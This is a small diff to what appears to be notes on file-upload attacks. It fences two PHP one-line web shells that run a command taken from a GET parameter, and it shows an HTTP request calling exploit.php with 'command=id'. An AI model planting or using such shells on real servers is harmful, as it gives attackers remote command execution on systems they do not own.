@@ -23,11 +23,13 @@ file --mime-type some_file.ext
 -------------------------------------------
 Additional shell
 
+```php
 <?php echo system($_GET['command']); ?>
 
 <?php passthru($_GET['command'])>
+```
+
 
 HTTP-request
 GET /example/exploit.php?command=id HTTP/1.1
 
-Some new text lets
